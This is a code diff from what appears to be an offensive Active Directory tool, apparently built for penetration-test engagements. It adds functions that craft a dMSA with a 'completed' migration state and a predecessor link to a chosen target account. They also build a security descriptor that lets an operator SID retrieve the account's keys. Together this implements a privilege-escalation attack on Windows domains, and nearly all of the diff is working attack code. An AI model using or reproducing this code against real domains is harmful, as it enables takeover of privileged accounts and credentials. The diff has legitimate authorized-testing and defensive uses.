@@ -3,6 +3,7 @@ from __future__ import annotations
 import os
 
 from ldap3 import BASE, Connection
+from impacket.ldap import ldaptypes
 
 from dmsa_reaper.ldap.query import ensure_search_succeeded
 from dmsa_reaper.models import Operation
@@ -24,6 +25,12 @@ DMSA_UAC = 4096
 # 30 matches the Microsoft schema default for msDS-ManagedServiceAccount.
 DMSA_MANAGED_PASSWORD_INTERVAL = 30
 
+# RC4_HMAC | AES128_CTS_HMAC_SHA1_96 | AES256_CTS_HMAC_SHA1_96.
+# This matches the account shape emitted by the Impacket/BloodyAD dMSA
+# engagement implementations while still allowing an AES-only KDC to choose
+# either AES enctype.
+DMSA_SUPPORTED_ENCRYPTION_TYPES = 0x1C
+
 # msDS-DelegatedMSAState values used by the directory protocol.
 #   0 = unknown / not set
 #   1 = migration in progress
@@ -37,6 +44,74 @@ DMSA_STATE_UNKNOWN = 0
 DMSA_STATE_IN_PROGRESS = 1
 DMSA_STATE_COMPLETED = 2
 DMSA_STATE_STANDALONE = 3
+
+
+def build_group_msa_membership_sd(principal_sid: str) -> bytes:
+    """Build the managed-password retrieval policy for one operator SID.
+
+    msDS-GroupMSAMembership is itself a self-relative security descriptor.  The
+    KDC uses it to decide whether the principal requesting a dMSA key package is
+    authorized.  The descriptor below is equivalent to the SDDL used by
+    BloodyAD's dMSA implementation:
+
+        O:BAD:(A;;0xf01ff;;;<principal SID>)
+    """
+    if not principal_sid or not principal_sid.upper().startswith("S-"):
+        raise ValueError("a valid operator principal SID is required for dMSA key retrieval")
+
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    sd["Revision"] = b"\x01"
+    sd["Sbz1"] = b"\x00"
+    # SE_SELF_RELATIVE | SE_DACL_PRESENT.
+    sd["Control"] = 0x8004
+
+    owner = ldaptypes.LDAP_SID()
+    owner.fromCanonical("S-1-5-32-544")  # BUILTIN\Administrators
+    sd["OwnerSid"] = owner
+    sd["GroupSid"] = b""
+    sd["Sacl"] = b""
+
+    acl = ldaptypes.ACL()
+    acl["AclRevision"] = 4
+    acl["Sbz1"] = 0
+    acl["Sbz2"] = 0
+    acl.aces = []
+
+    ace = ldaptypes.ACE()
+    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    ace["AceFlags"] = 0
+    allowed = ldaptypes.ACCESS_ALLOWED_ACE()
+    allowed["Mask"] = ldaptypes.ACCESS_MASK()
+    allowed["Mask"]["Mask"] = 0x000F01FF
+    allowed["Sid"] = ldaptypes.LDAP_SID()
+    allowed["Sid"].fromCanonical(principal_sid)
+    ace["Ace"] = allowed
+    acl.aces.append(ace)
+    sd["Dacl"] = acl
+    return sd.getData()
+
+
+def build_dmsa_creation_attributes(
+    *,
+    cn: str,
+    domain: str,
+    principal_sid: str,
+    target_dn: str,
+) -> dict[str, object]:
+    """Return the common, ticket-capable attributes for a new dMSA."""
+    dns_domain = domain.strip().strip(".").lower()
+    if not dns_domain:
+        raise ValueError("domain is required to construct the dMSA DNS hostname")
+    return {
+        "sAMAccountName": f"{cn}$",
+        "dNSHostName": f"{cn.lower()}.{dns_domain}",
+        "userAccountControl": DMSA_UAC,
+        "msDS-ManagedPasswordInterval": DMSA_MANAGED_PASSWORD_INTERVAL,
+        "msDS-GroupMSAMembership": build_group_msa_membership_sd(principal_sid),
+        "msDS-DelegatedMSAState": DMSA_STATE_COMPLETED,
+        "msDS-ManagedAccountPrecededByLink": target_dn,
+        "msDS-SupportedEncryptionTypes": DMSA_SUPPORTED_ENCRYPTION_TYPES,
+    }
 
 
 def generate_dmsa_name(hint: str | None = None) -> str:
